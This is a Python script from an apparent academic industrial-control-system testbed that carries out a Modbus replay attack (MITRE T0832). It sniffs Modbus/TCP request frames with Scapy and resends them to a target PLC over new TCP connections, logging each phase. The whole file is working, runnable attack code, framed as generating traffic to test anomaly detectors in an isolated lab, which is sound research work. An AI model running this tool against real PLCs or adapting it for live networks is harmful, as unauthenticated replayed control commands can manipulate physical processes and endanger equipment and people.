#!/usr/bin/env python3
"""
ASCEND-PG attacks/replay_attack.py

Scapy-based packet replay attack (MITRE ATT&CK for ICS: T0832 —
Manipulation of Control).

Two-phase attack:
  Phase 1 (capture): sniff legitimate Modbus traffic between the SCADA
      client and a PLC using Scapy's sniff() with a BPF filter.
  Phase 2 (replay): retransmit the captured Modbus request payloads
      back to the target PLC over fresh TCP connections.

Replayed Modbus traffic is byte-identical to legitimate traffic at the
signature level — this is the canonical case where trained anomaly
detectors (LSTM/Autoencoder) add value over signature-based IDS like
Suricata, which cannot distinguish replayed frames from originals.

Run this ON THE ATTACKER HOST inside the Mininet topology:
    python3 attacks/replay_attack.py --target 10.0.0.1 --iface s1-eth7

NOTE: Scapy sniffing requires root/sudo privileges (which Mininet
hosts already have). The interface must be one the attacker host can
see traffic on — typically the switch mirror port or the attacker's
own interface if traffic passes through it.

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import socket
import struct
import time
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

MODBUS_PORT = 502
DEFAULT_CAPTURE_TIME = 5
DEFAULT_REPLAY_COUNT = 1
DEFAULT_DELAY = 0.1


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def capture_modbus_traffic(iface: str, capture_time: float,
                           target_port: int = MODBUS_PORT) -> list:
    """Sniff Modbus/TCP traffic and extract MBAP+PDU payloads.

    Returns a list of dicts, each containing the raw Modbus payload
    bytes (MBAP header + PDU) from a captured request packet.
    """
    try:
        from scapy.all import sniff, TCP, Raw
    except ImportError:
        print("[replay] ERROR: Scapy is not installed. "
              "Install with: pip3 install scapy")
        return []

    print(f"[replay] Capturing Modbus traffic on {iface} for "
          f"{capture_time}s (filter: tcp dst port {target_port}) ...")

    bpf = f"tcp dst port {target_port}"
    packets = sniff(iface=iface, filter=bpf, timeout=capture_time)

    payloads = []
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            raw_data = bytes(pkt[Raw].load)
            # Validate it looks like a Modbus/TCP frame:
            # MBAP header is at least 7 bytes, protocol ID should be 0
            if len(raw_data) >= 7:
                proto_id = struct.unpack(">H", raw_data[2:4])[0]
                if proto_id == 0:  # Modbus protocol ID
                    payloads.append({
                        "data": raw_data,
                        "src": pkt[TCP].sport if pkt.haslayer(TCP) else 0,
                        "length": len(raw_data),
                    })

    print(f"[replay] Captured {len(payloads)} Modbus request frame(s) "
          f"from {len(packets)} total packets")
    return payloads


def replay_payloads(target_ip: str, target_port: int, payloads: list,
                    replay_count: int = 1, delay: float = 0.1) -> dict:
    """Replay captured Modbus payloads to the target PLC.

    Opens a fresh TCP connection and sends each captured MBAP+PDU
    payload. This simulates a replay attack where previously observed
    legitimate commands are re-sent to the PLC.

    Returns a summary dict.
    """
    total_sent = 0
    total_errors = 0

    for replay_round in range(1, replay_count + 1):
        print(f"[replay] Replay round {replay_round}/{replay_count} "
              f"({len(payloads)} frames) ...")

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(5)
            sock.connect((target_ip, target_port))

            for i, payload_info in enumerate(payloads):
                try:
                    sock.sendall(payload_info["data"])
                    total_sent += 1
                except (socket.timeout, OSError) as exc:
                    total_errors += 1
                    print(f"[replay] Send error on frame {i+1}: {exc}")
                    break

                if delay > 0:
                    time.sleep(delay)
        except (socket.timeout, OSError) as exc:
            total_errors += 1
            print(f"[replay] Connection error on round {replay_round}: {exc}")
        finally:
            try:
                sock.close()
            except OSError:
                pass

    return {
        "target": target_ip,
        "frames_captured": len(payloads),
        "replay_rounds": replay_count,
        "total_sent": total_sent,
        "total_errors": total_errors,
    }


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Replay Attack (T0832) — capture and replay "
                    "Modbus traffic")
    parser.add_argument("--target", required=True,
                        help="Target PLC IP to replay traffic to")
    parser.add_argument("--port", type=int, default=MODBUS_PORT,
                        help=f"Target Modbus port (default: {MODBUS_PORT})")
    parser.add_argument("--iface", default="eth0",
                        help="Network interface to sniff on (default: eth0)")
    parser.add_argument("--capture-time", type=float, default=DEFAULT_CAPTURE_TIME,
                        help=f"Seconds to capture traffic (default: "
                             f"{DEFAULT_CAPTURE_TIME})")
    parser.add_argument("--replay-count", type=int, default=DEFAULT_REPLAY_COUNT,
                        help=f"Number of replay rounds (default: "
                             f"{DEFAULT_REPLAY_COUNT})")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                        help=f"Delay between replayed frames in seconds "
                             f"(default: {DEFAULT_DELAY})")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Phase 1: Capture
    log_event(log_path, {
        "stage": "attack", "technique": "T0832",
        "action": "replay_capture_start", "target": args.target,
        "iface": args.iface, "capture_time": args.capture_time,
    })

    payloads = capture_modbus_traffic(args.iface, args.capture_time,
                                      args.port)

    log_event(log_path, {
        "stage": "attack", "technique": "T0832",
        "action": "replay_capture_done",
        "frames_captured": len(payloads),
    })

    if not payloads:
        print("[replay] No Modbus frames captured — nothing to replay. "
              "Check that SCADA traffic is active and the interface is correct.")
        log_event(log_path, {
            "stage": "attack", "technique": "T0832",
            "action": "replay_abort", "reason": "no_frames_captured",
        })
        return

    # Phase 2: Replay
    log_event(log_path, {
        "stage": "attack", "technique": "T0832",
        "action": "replay_start", "target": args.target,
        "frames": len(payloads), "replay_count": args.replay_count,
    })

    try:
        result = replay_payloads(args.target, args.port, payloads,
                                 replay_count=args.replay_count,
                                 delay=args.delay)
    except Exception as exc:
        log_event(log_path, {
            "stage": "attack", "technique": "T0832",
            "action": "replay_error", "target": args.target,
            "error": str(exc),
        })
        print(f"[replay] FAILED: {exc}")
        raise

    log_event(log_path, {
        "stage": "attack", "technique": "T0832",
        "action": "replay_result", "target": args.target,
        "result": result, "success": True,
    })
    print(f"[replay] Done — {result['total_sent']} frames replayed to "
          f"{args.target} across {result['replay_rounds']} round(s)")


if __name__ == "__main__":
    main()
